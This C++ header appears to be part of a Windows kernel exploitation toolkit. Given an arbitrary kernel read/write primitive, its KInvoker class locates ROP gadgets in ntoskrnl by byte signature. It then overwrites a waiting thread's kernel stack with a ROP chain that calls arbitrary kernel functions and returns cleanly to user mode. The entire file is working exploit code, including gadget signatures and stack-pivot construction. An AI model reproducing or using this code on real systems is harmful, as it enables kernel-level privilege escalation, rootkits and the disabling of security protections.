#pragma once

#include "Resolves.h"
#include "Offsets.h"
#include "Nt.h"
#include "Log.h"

#include <queue>
#include <functional>
#include <condition_variable>
#include <atomic>

constexpr ULONG c_TrapFrameSize = 0x190;

class KInvoker
{
public:
	KInvoker() : m_TerminateWorker( false ) {
		m_WorkerThread = std::thread( &KInvoker::WorkerThread, this );
		if (!InitializeGadgets()) {
			// error
		}
	}

	~KInvoker() {
		{
			std::lock_guard<std::mutex> lock( m_TaskQueueMutex );
			m_TerminateWorker = true;
		}
		m_QueueUpdateVariable.notify_all();
		if (m_WorkerThread.joinable()) {
			m_WorkerThread.join();
		}
	}

	template <typename... Args>
	Qword CallKernelFunction(
		const char* FunctionName,
		Args... Arguments
	) {
		std::optional<kAddress> function = g_KernelBinary->ResolveExport( FunctionName );
		if (!function) {
			LOG_WARN( "Failed to resolve function name %s", FunctionName );
			return -1;
		}

		return CallKernelFunction( function.value(), Arguments... );
	}

	static void WaitUntilThreadIsWaiting( DWORD ThreadTid )
	{
		HANDLE thread = OpenThread( THREAD_QUERY_INFORMATION, false, ThreadTid );
		if (thread == 0) {
			LOG_FAIL( "Failed to acquire thread handle, le=%d", GetLastError() );
			throw std::runtime_error( "OpenThread" );
		}

		while (true)
		{
			SYSTEM_THREAD_INFORMATION info = { 0 };
			NTSTATUS status = NtQueryInformationThread(
				thread,
				ThreadSystemThreadInformation,
				&info,
				sizeof( info ),
				nullptr
			);

			if (!NT_SUCCESS( status )) {
				LOG_FAIL( "Failed to call NtQueryInformationThread, status=0x%08x", status );
				CloseHandle( thread );
				throw std::runtime_error( "NtQueryInformationThread" );
			}

			if (info.ThreadState == static_cast<ULONG>(KTHREAD_STATE::Waiting)) break;
		}

		LOG_DEBUG( "Finished waiting" );
		CloseHandle( thread );
	}

	//
	// Calls a kernel function by its address. Note that SMAP is off.
	//
	template <typename... Args>
	Qword CallKernelFunction(
		kAddress Function,
		Args... Arguments )
	{
		auto args = std::make_tuple( std::forward<Args>( Arguments )... );
		HANDLE event = CreateEventA( nullptr, true, false, nullptr );

		DWORD currentTid = GetCurrentThreadId();

		m_TaskQueue.push( [&] {
			LOG_DEBUG( "Starting worker, tid=%d", currentTid );

			WaitUntilThreadIsWaiting( currentTid );
			std::optional<kAddress> thread = Resolves::GetThreadAddressInProcess( currentTid, GetCurrentProcessId() );
			if (!thread) {
				FATAL( "Failed to resolve thread address, tid=%d", currentTid );
			}

			LOG_DEBUG( "Calling kernel function at 0x%llx, thread address is 0x%llx", Function, thread.value() );

			OverrideThreadStackWithFunctionCall( Function, thread.value(), args );
			SetEvent( event );
			} );

		m_QueueUpdateVariable.notify_all();

		auto returnValue = NtWaitForSingleObject( event, false, nullptr );
		LOG_DEBUG( "Returned from NtWaitForSingleObject, return value is 0x%08llx", returnValue );
		CloseHandle( event );

		return returnValue;
	}

private:

	//
	// Copies stack arguments from ArgsTuple into the stack, assuming the current stack
	// pointer is Rsp, after sufficent stacj space has been reserved (see add rsp gadget).
	// 
	// Note: I hate C++.
	//
	template <typename ArgsTuple, size_t... Indicies>
	static void CopyStackArgumentsHelper(
		kAddress Rsp,
		const ArgsTuple& Arguments,
		std::index_sequence<Indicies...> )
	{
		Qword remainingArgs[] = {
			(Indicies >= 4 ? Qword( std::get<Indicies>( Arguments ) ) : Qword{})...
		};

		auto numberOfStackArgs = sizeof...(Indicies) - 4;

		// reserve shadow space
		kAddress argumentsStart = Rsp + 0x20;
		g_Rw->WriteBuffer( argumentsStart, std::span<Byte>( (Byte*)(remainingArgs + 4), numberOfStackArgs * sizeof(Qword) ) );
	}

	static kAddress GetNtWaitForSingleObjectReturnAddress(
		_In_ kAddress CallingThread,
		_Out_ std::vector<Byte>& TrapFrameData )
	{
		//
		// We target the last return address before returning to UserMode. The call stack after
		// calling NtWaitForSingleObject is something like the following:
		// - nt!NtWaitForSingleObject
		// - nt!KiSystemServiceCopyEnd+0x25
		// - ntdll!NtWaitForSingleObject
		//
		// Note that we're switching to UM stack after KiSystemServiceCopyEnd, hence it makes sense to target it.
		// We'll start scanning from the initial stack 
		//

		kAddress initialStack = g_Rw->ReadQword( CallingThread + Offsets::EThread::InitialStack );

		// Initial stack layout, stack grows down
		// 
		// |-----------------------------|
		// | KiSystemServiceCopyEnd+0x25 | <- Target address (lower address)
		// |-----------------------------|
		// |                             |
		// |         KTRAP_FRAME         |
		// |			                 |
		// |-----------------------------| <- Initial stack (higher address)
		//

		Dword savedFrameLength = c_TrapFrameSize + sizeof( kAddress );
		kAddress returnAddress = initialStack - savedFrameLength;
		TrapFrameData = g_Rw->ReadBuffer( returnAddress, savedFrameLength );

		return returnAddress;
	}

	template <typename... Args>
	void OverrideThreadStackWithFunctionCall(
		_In_ kAddress Function,
		_In_ kAddress CallingThread,
		_In_ std::tuple<Args...> Arguments )
	{
		//
		// We're restricted in the number of arguments we have, so before we're doing anything let's make sure
		// we're covered.
		//

		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
		if (NumberOfArguments > m_MaxAllowedStackArguments + 4) {
			LOG_FAIL( "Cannot call function 0x%llx with 0x%llx arguments, more than the allowed 0x%llx",
				Function, NumberOfArguments, m_MaxAllowedStackArguments + 4 );
			throw std::runtime_error( "Invalid number of arguments" );
		}

		std::vector<Byte> previousStackData;
		kAddress rsp = GetNtWaitForSingleObjectReturnAddress( CallingThread, previousStackData );
		LOG_DEBUG( "Starting to overwrite from 0x%llx", rsp );

#define PUT_STACK(val) do { g_Rw->WriteQword(rsp, Qword(val)); LOG_DEBUG("Rsp: 0x%llx, val:0x%llx", rsp, Qword(val)); rsp += 8; } while (false);

		// Our pivot gadget uses rbp as the new stack pointer

		auto newRsp = rsp - 0x1000;

		PUT_STACK( m_Gadgets.PopRbp );
		PUT_STACK( newRsp );

		PUT_STACK( m_Gadgets.StackPivot );

		rsp = newRsp;		// mov rsp, rbp
		rsp += 0x30;		// add rsp, 0x30
		PUT_STACK( 0x1337 );	// pop rdi
		PUT_STACK( 0x1337 );	// pop rsi

		//
		// This will be the final value rbp takes before getting to the called function,
		// and returning into KiSystemCall64. As rbp is a nonvolatile register,
		// it is expected to be a pointer into the saved data. We'll populate it later
		// when we know where the saved data resides.
		//
		kAddress pRbpValue = rsp;
		PUT_STACK( 0x1337 );	// pop rbp

		PUT_STACK( m_Gadgets.Retpoline );

		rsp += 0x20;

		//
		// If we have more than 4 arguments, we need to get ourselves a bit more stack space,
		// so instead of jumping to the function after the retpoline gadget,
		// we'll pivot to a slightly lower address.
		//

		constexpr bool HaveStackArguments = NumberOfArguments > 4;

		// add jump target
		PUT_STACK( Function );

		// add register arguments
		auto beforeArgs = rsp;

		if constexpr (NumberOfArguments >= 1) PUT_STACK( std::get<0>( Arguments ) );
		if constexpr (NumberOfArguments >= 2) PUT_STACK( std::get<1>( Arguments ) );
		if constexpr (NumberOfArguments >= 3) PUT_STACK( std::get<2>( Arguments ) );
		if constexpr (NumberOfArguments >= 4) PUT_STACK( std::get<3>( Arguments ) );

		rsp = beforeArgs + 0x20;

		//
		// If we have stack arguments, we need to write some additional data
		// and make sure execution returns normally after the function - hence the add rsp gadget.
		//

		// add remaining stack arguments
		if constexpr (NumberOfArguments >= 5)
		{
			PUT_STACK( m_Gadgets.AddRsp.Address );
			CopyStackArgumentsHelper( rsp, Arguments, std::make_index_sequence<NumberOfArguments>{} );

			rsp += m_Gadgets.AddRsp.Offset;
		}


		//
		// Go back to where we've been - and return to user mode lol
		// 
		// Note that the buffer contains the return address to nt!KiSystemServiceCopyEnd.
		//

		LOG_DEBUG( "Writing saved stack data from %p sized 0x%llx, to 0x%llx", previousStackData.data(), previousStackData.size(), rsp );
		g_Rw->WriteBuffer( rsp, std::span<Byte>( previousStackData.data(), previousStackData.size() ) );

		// Remember to set rbp!
		g_Rw->WriteQword( pRbpValue, rsp + 0x80 + 8 );

		//std::memcpy(rsp, previousStackData.data(), previousStackData.size());
	}

	void WorkerThread()
	{
		while (true)
		{
			std::function<void()> workItem;
			{
				std::unique_lock<std::mutex> lock( m_TaskQueueMutex );
				m_QueueUpdateVariable.wait( lock, [this] { return !m_TaskQueue.empty() || m_TerminateWorker; } );

				if (m_TerminateWorker && m_TaskQueue.empty()) {
					return;
				}

				workItem = std::move( m_TaskQueue.front() );
				m_TaskQueue.pop();
			}
			LOG_DEBUG( "Running work item..." );
			workItem();
		}
	}

	static std::optional<kAddress> FindAddRspGadget( Byte& Offset )
	{
		std::optional<kAddress> gadgetAddress = std::nullopt;
		Byte maxOffset = 0;

		//
		// We want to support at least (0x60 - 0x20) / 8 = 8 stack arguments.
		//		
		//	Note: we're subtracting 0x20 for the shadow space, and dividing by 8 because stack. 
		//	See OverrideThreadStackWithFunctionCall for more info.
		//
		constexpr Byte MinAllowedRspOffset = 0x60;

		// add rsp, ?; ret
		auto addRspRet = Sig::FromHex( "48 83 C4 * C3" );
		LOG_DEBUG( "add rsp, ret: %p", addRspRet.data() );

		g_KernelBinary->ForEveryCodeSignatureOccurrence( addRspRet,
			[&]( const Byte* Occurrence ) -> bool {
				Byte rspOffset = *(Occurrence + 3);

				// irrelevant, continue search
				if (rspOffset < MinAllowedRspOffset) return true;

				if (rspOffset > maxOffset) {
					gadgetAddress = g_KernelBinary->MappedToKernel( Occurrence );
					maxOffset = rspOffset;
				}

				return true;
			} );

		Offset = maxOffset;

		return gadgetAddress;
	}

	bool InitializeGadgets()
	{
		LOG_DEBUG( "Finding gadgets..." );

		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
		auto retpolineSignature = Sig::FromHex( RetpolineCode );
		auto retpolineAddress = g_KernelBinary->FindSignature( retpolineSignature, KernelBinary::LocationFlags::InCode );
		if (!retpolineAddress) return false;
		m_Gadgets.Retpoline = retpolineAddress.value();

		LOG_DEBUG( "Found retpoline gadget at 0x%llx", retpolineAddress.value() );

		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
		auto stackPivotSignature = Sig::FromHex( StackPivotCode );
		auto stackPivotAddress = g_KernelBinary->FindSignature( stackPivotSignature, KernelBinary::LocationFlags::InCode );
		if (!stackPivotAddress) return false;
		m_Gadgets.StackPivot = stackPivotAddress.value();

		LOG_DEBUG( "Found stack pivot gadget at 0x%llx", stackPivotAddress.value() );

		auto PopRbpSignature = Sig::FromHex( "5dc3" );
		auto popRbp = g_KernelBinary->FindSignature( PopRbpSignature, KernelBinary::LocationFlags::InCode );
		if (!popRbp) return false;
		m_Gadgets.PopRbp = popRbp.value();

		LOG_DEBUG( "Found pop rbp gadget at 0x%llx", popRbp.value() );

		Byte rspOffset = 0;
		auto addRspGadget = FindAddRspGadget( rspOffset );
		if (!addRspGadget) {
			LOG_FAIL( "Failed to find add rsp gadget with sufficent space for stack arguments" );
		}

		LOG_DEBUG( "Found add rsp, ? gadget at 0x%llx, offset=0x%x", addRspGadget.value(), rspOffset );

		m_Gadgets.AddRsp.Address = addRspGadget.value();
		m_Gadgets.AddRsp.Offset = rspOffset;
		m_MaxAllowedStackArguments = (rspOffset - 0x20) / sizeof( Qword );
		LOG_INFO( "Restricted to %d stack arguments at most", m_MaxAllowedStackArguments );

		LOG_INFO( "Found all gadgets!" );
		return true;
	}


private:
	std::queue<std::function<void()>> m_TaskQueue;
	std::thread m_WorkerThread;
	std::mutex m_TaskQueueMutex;
	std::condition_variable m_QueueUpdateVariable;
	std::atomic<bool> m_TerminateWorker;

	struct Gadgets_t {

		//
		// Used to set calling registers.
		//
		// __guard_retpoline_exit_indirect_rax:
		//  ...
		//	mov rax, [rsp+0x20]
		//	mov rcx, [rsp+0x28]
		//	mov rdx, [rsp+0x30]
		//	mov r8,  [rsp+0x38]
		//	mov r9,  [rsp+0x40]
		//	add rsp, 0x48
		//  jmp rax
		//
		kAddress Retpoline;

		//
		// Stack pivot gadget. Looks as follows:
		// 
		// RtlRestoreContext:
		// ...
		// mov     rsp, rbp
		// add     rsp, 30h
		// pop     rdi
		// pop     rsi
		// pop     rbp
		// retn
		//
		kAddress StackPivot;

		//
		// Simply pop rbp; ret; 
		//
		kAddress PopRbp;

		//
		// Some gadget of the form add rsp, ?; ret
		//
		struct {
			// Gadget address
			kAddress Address;

			// Offset by which we're adding rsp
			Byte Offset;
		} AddRsp;

	} m_Gadgets;

	// Max allowed stack arguments, restricted by availibility of add rsp,? gadgets
	// in local ntos.
	Dword m_MaxAllowedStackArguments;
};
